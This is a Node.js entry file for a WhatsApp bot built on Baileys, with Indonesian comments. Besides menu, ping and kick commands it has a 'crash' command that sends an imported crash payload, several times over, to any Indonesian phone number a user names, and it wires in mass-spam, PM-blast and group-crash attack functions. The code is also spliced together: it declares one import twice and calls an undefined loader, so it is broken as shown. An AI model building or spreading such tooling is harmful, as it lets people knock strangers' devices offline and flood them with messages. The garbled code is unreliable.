// index.js
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');
const pino = require('pino');
const config = require('./config.js');

// Import functions
const { xeoninvisible } = require('./lib/crash.js');
const { showMenu } = require('./handler/menu.js');
// TAMBAHKAN DI BAWAH IMPORTS
const { xeoninvisible } = await `${fol[0]}crash.js`.r();
const { spamMassal, blastPMMassal, crashGroup } = await `${fol[0]}attack.js`.r();

// TAMBAHKAN SETELAH EXP DIBUAT
Exp.xeonAttack = {
  crash: xeoninvisible,
  spam: spamMassal,
  blast: blastPMMassal,
  groupCrash: crashGroup
};
let sock = null;

async function connectToWhatsApp() {
  const { state, saveCreds } = await useMultiFileAuthState(config.sessionName);
  
  // Socket configuration based on connection method
  const socketConfig = {
    auth: state,
    logger: pino({ level: 'silent' }),
    browser: Browsers.ubuntu('Chrome'),
    markOnlineOnConnect: true,
    syncFullHistory: false
  };
  
  // Add pairing code config if using pairing method
  if (config.connectionMethod === 'pairing') {
    socketConfig.generatePairingCode = true;
    socketConfig.phoneNumber = config.ownerNumber;
  }
  
  sock = makeWASocket(socketConfig);

  sock.ev.on('creds.update', saveCreds);
  
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr, pairingCode } = update;
    
    // Handle QR Code (if using QR method)
    if (qr && config.connectionMethod === 'qr') {
      console.log('╔══════════════════════════════════════╗');
      console.log('║        SCAN QR CODE BELOW            ║');
      console.log('╚══════════════════════════════════════╝');
      qrcode.generate(qr, { small: true });
      console.log('\n📱 Scan QR di WhatsApp: WhatsApp → Settings → Linked Devices');
    }
    
    // Handle Pairing Code
    if (pairingCode && config.connectionMethod === 'pairing') {
      console.log('╔══════════════════════════════════════╗');
      console.log('║          PAIRING CODE                ║');
      console.log('╠══════════════════════════════════════╣');
      console.log(`║           ${pairingCode}           ║`);
      console.log('╚══════════════════════════════════════╝');
      console.log('\n📱 Masukin di WhatsApp: Settings → Linked Devices → Link a Device');
    }
    
    // Connection opened
    if (connection === 'open') {
      console.log('\n╔══════════════════════════════════════╗');
      console.log('║      BOT CONNECTED SUCCESSFULLY      ║');
      console.log('╠══════════════════════════════════════╣');
      console.log(`║ Bot Name: ${config.botName.padEnd(25)} ║`);
      console.log(`║ Owner: ${config.ownerName.padEnd(28)} ║`);
      console.log(`║ Prefix: ${config.botPrefix.padEnd(28)} ║`);
      console.log('╚══════════════════════════════════════╝\n');
      
      // Send welcome message to owner
      await sock.sendMessage(`${config.ownerNumber}@s.whatsapp.net`, { 
        text: `${config.messages.welcome}\n\nBot Name: ${config.botName}\nVersion: ${config.botVersion}\nPrefix: ${config.botPrefix}\nConnection: ${config.connectionMethod.toUpperCase()}` 
      });
    }
    
    // Connection closed
    if (connection === 'close') {
      const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(`\n⚠️ Connection closed, ${shouldReconnect ? 'reconnecting in 5s...' : 'logged out'}`);
      if (shouldReconnect) {
        setTimeout(connectToWhatsApp, 5000);
      }
    }
  });
  
  // Message handler
  sock.ev.on('messages.upsert', async (m) => {
    const msg = m.messages[0];
    if (!msg.message || msg.key.fromMe) return;
    await handleMessage(msg);
  });
  
  // Group events
  sock.ev.on('group-participants.update', async (update) => {
    const { id, participants, action } = update;
    
    if (action === 'add' && participants.includes(sock.user.id)) {
      console.log(`📥 Bot added to group: ${id}`);
      await sock.sendMessage(id, { 
        text: `${config.messages.groupJoined || '🤖 Bot joined!'}\n\nKetik ${config.botPrefix}menu untuk melihat fitur!` 
      });
    }
    
    if (action === 'remove' && participants.includes(sock.user.id)) {
      console.log(`📤 Bot removed from group: ${id}`);
    }
  });
  
  return sock;
}

// Handle message function (sama seperti sebelumnya)
async function handleMessage(msg) {
  try {
    const text = msg.message.conversation || 
                 msg.message.extendedTextMessage?.text || 
                 msg.message.imageMessage?.caption || '';
    const sender = msg.key.remoteJid;
    const pushname = msg.pushName || 'User';
    
    if (!text.startsWith(config.botPrefix)) return;
    
    const command = text.slice(config.botPrefix.length).trim().split(' ')[0].toLowerCase();
    const args = text.slice(config.botPrefix.length + command.length).trim().split(' ');
    
    console.log(`📨 ${pushname}: ${config.botPrefix}${command} ${args.join(' ')}`);
    
    // CRASH COMMAND
    if (command === 'crash' && config.enableCrash) {
      if (!args[0]) {
        return sock.sendMessage(sender, { text: `Format: ${config.botPrefix}crash 628xxxxxxx` });
      }
      
      const target = args[0].replace(/\D/g, '');
      if (!target.startsWith('62')) {
        return sock.sendMessage(sender, { text: 'Nomor harus diawali 62 (Indonesia)' });
      }
      
      const targetJid = `${target}@s.whatsapp.net`;
      
      await sock.sendMessage(sender, { text: `💀 MENGIRIM CRASH KE ${target}...` });
      
      try {
        for (let i = 0; i < config.crashRepeat; i++) {
          await xeoninvisible(sock, targetJid);
          console.log(`[${i+1}/${config.crashRepeat}] Crash sent to ${target}`);
          await delay(1000);
        }
        
        await sock.sendMessage(sender, { 
          text: `${config.messages.crashSuccess}\n\nTarget: ${target}\nJumlah: ${config.crashRepeat}x` 
        });
      } catch (error) {
        await sock.sendMessage(sender, { text: config.messages.crashFailed });
      }
    }
    
    // MENU COMMAND
    else if (command === 'menu') {
      await showMenu(sock, sender, pushname);
    }
    
    // GROUP COMMANDS
    else if (command === 'kick' && sender.endsWith('@g.us')) {
      const target = msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
      if (!target) {
        return sock.sendMessage(sender, { text: `Tag orang yang mau di kick!\nContoh: ${config.botPrefix}kick @orang` });
      }
      
      try {
        await sock.groupParticipantsUpdate(sender, [target], 'remove');
        await sock.sendMessage(sender, { text: `✅ Berhasil kick @${target.split('@')[0]}` });
      } catch (error) {
        await sock.sendMessage(sender, { text: '❌ Gagal kick' });
      }
    }
    
    // ... (other commands sama seperti sebelumnya)
    
    else if (command === 'ping') {
      const start = Date.now();
      await sock.sendMessage(sender, { text: '🏓 Pong!' });
      const latency = Date.now() - start;
      await sock.sendMessage(sender, { text: `⚡ Latency: ${latency}ms` });
    }
    
    else if (command === 'owner') {
      await sock.sendMessage(sender, { 
        text: `👑 OWNER BOT:\n\nNama: ${config.ownerName}\nNomor: ${config.ownerNumber}` 
      });
    }
    
  } catch (error) {
    console.error('Message handler error:', error);
  }
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Start bot
connectToWhatsApp();
